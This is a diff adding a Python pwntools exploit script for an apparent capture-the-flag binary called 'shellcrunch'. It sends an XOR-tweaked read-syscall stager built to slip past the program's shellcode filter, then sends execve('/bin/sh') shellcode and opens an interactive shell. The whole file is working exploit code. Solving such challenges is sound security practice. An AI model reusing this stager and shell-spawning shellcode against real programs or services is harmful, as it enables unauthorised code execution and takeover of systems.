@@ -1,0 +1,42 @@
+from pwn import *
+
+# someone said "honestly i've found that any restricted shellcoding problem like this, its a lot easier to just call read as quick as possible", input the read_shellcode at buf first to pass the check func, then input the binsh shellcode after
+
+#p = remote()
+p = process("./shellcrunch")
+
+# tool support: https://defuse.ca/online-x86-assembler.htm#disassembly
+shellcode_read = b"\xEB\x04\x90\x90\x90\x91\x48\x89\xFE\x48\x31\xFF\xEB\x04\x90\x90\x90\x91\x48\x31\xD2\xB2\xA0\x0F\x05"
+
+n = len(shellcode_read)
+res = b''
+for i in range(n):
+    if(i % 4 == 0 and i < n - 1):
+        res += bytes([shellcode_read[i] ^ shellcode_read[i + 1]])
+    else:
+        res += bytes([shellcode_read[i]])
+
+# warning:
+# >>> a = b'\xB8\XBA'
+# >>> a[0]
+# 184
+# >>> bytes([184])
+# b'\xb8'
+
+p.sendafter(b"Enter shellcode:\n", res)
+
+shellcode = asm('''
+xor rsi, rsi
+push rsi
+mov rdi, 0x68732f2f6e69622f
+push rdi
+push rsp
+pop rdi
+push 59
+pop rax
+cdq
+syscall
+''', arch = 'amd64')
+shellcode = b'A' * n + shellcode
+p.send(shellcode)
+p.interactive()
